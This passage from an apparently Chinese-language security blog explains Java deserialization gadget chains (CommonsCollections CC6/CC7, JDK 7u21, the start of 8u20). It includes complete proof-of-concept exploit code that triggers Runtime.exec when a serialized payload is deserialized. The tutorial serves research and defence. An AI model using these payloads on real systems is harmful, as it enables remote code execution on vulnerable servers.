(Object[])table.get(hashset_map);</span><br><span class="line">        <span class="comment">//3.将第一个entry的key设置为我们的tmap</span></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tmap);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然中间用到了LazyMap，那么又可以复用，InstantiateTransformer和TemplatesImpl，PoC就不粘在这里了，可以去看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p>
<h2 id="cc7"><a href="#cc7" class="headerlink" title="cc7"></a>cc7</h2><p>条件：</p>
<ul>
<li><p><strong>commons-collections:3.1-3.2.1</strong></p>
</li>
<li><p><strong>jdk1.7&amp;1.8</strong></p>
</li>
</ul>
<h3 id="利用链寻找-6"><a href="#利用链寻找-6" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>cc7的想法依然是寻找LazyMap.get()的触发点。</p>
<p>cc7的后半段和cc1的lazymap版本一样，触发点选择到了AbstractMap的equals方法来触发对LazyMap的get方法的调用：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517121849144.png" alt="image-20210517121849144"></p>
<p>这里如果m是可控的，那么可以设置m为LazyMap，这样就可以触发调用链的后半部分。</p>
<p>这里要寻找哪里调用了equals方法，ysoserial找到了HashTable的reconstitutionPut方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122453468.png" alt="image-20210517122453468"></p>
<p>这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。</p>
<p>现在问题来到了，如何才能触发reconstitutionPut方法呢？</p>
<p>我们发现在HashTable的readObject方法里面就调用了reconstitutionPut方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122844443.png" alt="image-20210517122844443"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">    <span class="keyword">int</span> elements = s.readInt();<span class="comment">//elements hashtable中的元素个数</span></span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;<span class="comment">//通过elements的长度读取键值对</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">        reconstitutionPut(table, key, value);<span class="comment">//该函数会对元素进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看reconstitutionPut方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);<span class="comment">//计算key的hash</span></span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;<span class="comment">//通过hash确定索引</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有相同元素，创建元素到hashtable中</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们跟着reconstitutionPut走，reconstitutionPut方法有三个参数：</p>
<p>table，key，value(后面这两个是流操作，看过writeObject就知道是hashtable自己的key和value属性)</p>
<p>跟进去reconstitutionPut：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517133736874.png" alt="image-20210517133736874"></p>
<p>我们当然希望走的是AbstractMap类的equals方法，并且保证参数key是LazyMap类型，这样就可以走上LazyMap.get这条熟悉的道路了。</p>
<p><strong>AbstractMap类是一个抽象类，他实现了Map接口中的equals方法。</strong></p>
<p><strong>HashMap是AbsrtactMap的实现类，他没有重写equals方法，所以如果是HashMap#equals方法，其实走的是AbstractMap的equals方法。</strong></p>
<p>也就是说，如果<code>e.key</code>是HashMap，<code>参数(key)</code>是LazyMap，是可以走得通的。</p>
<p>但是怎么才能走到这个判断呢，需要先保证前半部分<code>e.hash == hash</code>，其实在String.equals()方法中存在hash碰撞。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a = <span class="string">"yy"</span>;</span><br><span class="line">String b = <span class="string">"zZ"</span>;</span><br><span class="line">a.hashcode() == b.hashcode();<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>大家不要忘了，要想走到这里，最外层还有一个<code>e!=null</code>条件。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517143801027.png" alt="image-20210517143801027"></p>
<p>tab就是table属性，table是Hashtable用来存放entry的数组，初始状态就算有长度也是null占位。</p>
<p>所以我们要像进入if，需要<code>e!=null</code>成立。</p>
<p>需要先有一个lazymap进来，将table属性赋值、还有将hash值改成自己的参数，等后续第二个进来的lazymap再触发。</p>
<p>第二个进来的lazymap，才会符合e不为空，将自己的hash和e.hash比较。（用yy和zZ绕过）</p>
<p>进入e.key.equals(key)，e.key就是第一次进来的lazymap，参数key就是第二次进来的lazymap的innermap。</p>
<p>还有个细节，在第二次进入后，会进入lazymap2.equals(innermap2)</p>
<p>equals方法属于HashMap的父类AbstractMap，对于这部分来说，</p>
<p>LazyMap继承了AbstractMapDecorator的map属性，是Map接口，所以当构造函数的参数是HashMap类型，自然就是LazyMap的map属性自然就是HashMap类型了。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517144833958.png" alt="image-20210517144833958"></p>
<p>但是HashMap并没有equals方法，实际上走的是父类AbstractMap#equals方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517150342575.png" alt="image-20210517150342575"></p>
<h3 id="最终版本PoC-8"><a href="#最终版本PoC-8" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashTable_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先用一个假的chain占位置，稍后反射改回来</span></span><br><span class="line">        <span class="comment">//这里还是为了能够避开lazymap.put提前RCE</span></span><br><span class="line">        Transformer fakeChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建两个lazymap实例</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashTable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashTable.put(lazyMap1, <span class="string">"0range"</span>);</span><br><span class="line">        hashTable.put(lazyMap2, <span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 chain 数组</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(fakeChain, transformers_exec);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么需要remove掉第二次的lazymap？</p>
<p>因为Hashtable的put方法里面也调用了equals方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152132073.png" alt="image-20210517152132073"></p>
<p>会导致LazyMap2中右增加了(“yy“，”yy“)这个键值对，会影响当前lazymap2的size不再是1，而是2</p>
<p>导致在第二次进入的时候倒在了size的判断上。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152618059.png" alt="image-20210517152618059"></p>
<p>当然既然还是扯到LazyMap，当然可以复用之前的InstantiateTransformer，</p>
<p>具体可以看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p>
<h2 id="CC链总结"><a href="#CC链总结" class="headerlink" title="CC链总结"></a>CC链总结</h2><p>五大反序列化利用基类：</p>
<blockquote>
<p>1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。</p>
<p>2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。</p>
<p>3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。</p>
<p>4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。</p>
<p>5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。</p>
</blockquote>
<p>四大Transformer的transform：</p>
<blockquote>
<p>1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。    </p>
<p>2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）    </p>
<p>3.ConstantTransformer：返回成员变量iConstant的值。    </p>
<p>4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）    </p>
</blockquote>
<p>三大Map：</p>
<blockquote>
<p>1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。</p>
<p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p>
<p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p>
</blockquote>
<h1 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h1><p>条件：</p>
<ul>
<li>jdk&lt;=7u21</li>
</ul>
<p>这是一条十分有个性的链，因为它仅依赖jre，不依赖任何第三方库。</p>
<p>先说个小tip：神奇的<code>f5a5a608</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">"f5a5a608"</span>.hashCode()); == <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>用到了AnnotationInvocationHandler作为动态代理来触发cc2里面的TemplatesImpl携带恶意_bytecode，执行静态代码块加载。</p>
<p>前情回顾：</p>
<ul>
<li>TemplatesImpl 类可被序列化，并且其内部名为 _bytecodes 的成员可以用来存储某个 class 的字节数据</li>
<li>通过 TemplatesImpl 类的 getOutputProperties 方法 / newTransformer方法 ，可以最终导致 _bytecodes 所存储的字节数据被转换成为一个 Class（通过 ClassLoader.defineClass），并实例化此 Class，导致 Class 的构造方法/静态代码块中的代码被执行。</li>
</ul>
<p>光有链还是不够的，需要找个readObject的承接点，让这条链和反序列化入口点连接起来</p>
<p>7u21选择的入口点是LinkedHashSet的readObject方法，实际上是父类HashSet的readObject方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521093720662.png" alt="image-20210521093720662"></p>
<p>这里面的e就是反序列化后的对象。</p>
<p>为什么选择HashMap呢？是因为它有个神奇的equals方法</p>
<p>开启支线任务：</p>
<p>这里先进入AnnotationInvocationHandler的invoke方法看看：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521102440957.png" alt="image-20210521102440957"></p>
<p>这里如果调用的方法名称是equals，并且参数个数和类型匹配，就会进入equalsImpl方法</p>
<p>看一看equalsImpl方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521103501367.png" alt="image-20210521103501367"></p>
<p>到这里，梳理一下：</p>
<p>我们就在jdk里面找到了一个原生类AnnotationInvocationHandler，他可以充当动态代理，他的invoke方法会调用了本身的equalsImpl方法，在equalsImpl内部又会调用自身memberValues属性的get方法。</p>
<p>之前我们是将this.mamberValues赋值为LazyMap，但是现在我们需要找到一个jdk原生类。</p>
<p>发现下面还有一个invoke方法</p>
<p>ysoserial的思路肯定也是盯着哪些类有equals方法，我们的动态代理只要在之后去invoke这个equals方法就可以了。</p>
<p>世界线收束：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521110552890.png" alt="image-20210521110552890"></p>
<p>在我们之前发现的HashMap的put方法中，就会调用key的equals方法。</p>
<p>能到这里需要的条件：</p>
<ul>
<li>e.hash == hash</li>
<li>e.key == key</li>
</ul>
<p>首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，*<em>当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *</em>，则认为 key 是否已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素。</p>
<p>这里核心关键点就是让key指向的是我们通过动态代理生成的Proxy对象，我们知道调用Proxy对象的任何方法，本质上都是在调用InvokcationHandler对象中被重写的invoke方法。因为生成Proxy对象时传入的参数是InvokcationHandler的子类AnnotationInvocationHandler，所以自然要调用AnnotationInvocationHandler.invoke()方法。</p>
<p>这里有几个细节：</p>
<ol>
<li>首先需要保证我们传入携带动态代理的key之前，map里面就已经有一个entry了，才能保证e不为null，进入循环</li>
<li>第一个entry应该为Templates对象</li>
<li>为了保证有有序添加，所以我们才用LinkedHashSet</li>
</ol>
<p>这里先看一下限制条件：</p>
<ol>
<li><p>e.hash == hash</p>
<p>这个需要保证的是两个hash值相等，hash值就是<code>hash()</code>值相等</p>
<p>想到我们之前的提到的神奇的<code>f5a5a608</code>，它的hashcode()==0</p>
</li>
</ol>
<p>看一下hash()源码：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521111553605.png" alt="image-20210521111553605"></p>
<p>这里其实结果只受k.hashcode()的影响。</p>
<ul>
<li>对于普通的obj来说，这里k就是本身</li>
<li>对于一个代理类来说，统一调用invoke方法。如果当前的k是AnnotationInvocationHandler类，那么调用的就是AnnotationInvocationHandler类内部的hashCodeImpl()方法</li>
</ul>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112200882.png" alt="image-20210521112200882"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112527126.png" alt="image-20210521112527126"></p>
<p>跟进memberValueHashCode方法再看看：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112817611.png" alt="image-20210521112817611"></p>
<p>改写一下就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">( <span class="number">127</span> * key.hashCode() ) ^ value.hashCode()</span><br></pre></td></tr></table></figure>



<p>两个hash：</p>
<ul>
<li>TemplatesImpl实例.hashCode()</li>
<li>( 127 * key.hashCode() ) ^ TemplatesImpl实例.hashCode()</li>
</ul>
<p>我们希望key就是<code>f5a5a608</code>，这样的话返回值就是TemplatesImpl实例.hashCode()了，就可以绕过<code>e.hash == hash</code>的check了。</p>
<p>细节：</p>
<ul>
<li>可以看到hashCodeImpl()内部是有一个循环的，为了让最后的结果和value.hashCode()相同，我们希望memberValues只有一个entry，再put一个相同的key就行了，为了让tmpl和第一次的一样。</li>
<li>我们这里只需要让memberValue这个属性里面存放一个HashMap就行了，这个map的key是<code>f5a5a608</code>，value是包含恶意字节码的TemplatesImpl对象就行了</li>
</ul>
<h2 id="最终PoC"><a href="#最终PoC" class="headerlink" title="最终PoC"></a>最终PoC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/IINA.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//整个map,容量为2</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap(<span class="number">2</span>);</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="comment">// 放入实际的 value</span></span><br><span class="line">        map.put(magicStr, tmpl);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        HashSet target = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        target.add(tmpl);</span><br><span class="line">        target.add(proxy);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        fout.writeObject(target);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="8u20"><a href="#8u20" class="headerlink" title="8u20"></a>8u20</h1><p>环境：</p>
<ul>
<li>jdk &lt;= 8u20</li>
</ul>
<p>在说8u20之前，说一下7u21的修复：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521143008667.png" alt="image-20210521143008667"></p>
<p>可以看到，AnnotationInvocationHandler的readObject方法把this.type属性限制了<code>只能是注解</code>，所以我们7u21用的是<code>Templates.class</code>，是为了后续的<code>TemplatesImpl</code>的instanceof的检查可以通过。</p>
<p>在8u20中使用<code>BeanContextSupport</code>类对这个修补方式进行了绕过。</p>
<h2 id="基础知识补充-序列化"><a href="#基础知识补充-序列化" class="headerlink" title="基础知识补充-序列化"></a>基础知识补充-序列化</h2><p>整个例子</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160220634.png" alt="image-20210521160220634"></p>
<p>在ObjectOutputStream位置下个断点</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521155206766.png" alt="image-20210521155206766"></p>
<p>跟进去看，构造函数就做了很多事情，会来到writeStreamHeader方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160415081.png" alt="image-20210521160415081"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160518217.png" alt="image-20210521160518217"></p>
<p>写入了<code>aced0005</code></p>
<p>接下来看下<code>out.writeObject(object)</code>是怎么写入数据的？</p>
<p>会先解析class结构，判断是否实现了Serializable接口，是的话执行<code>writeOrdinaryObject</code>方法</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160831777.png" alt="image-20210521160831777"></p>
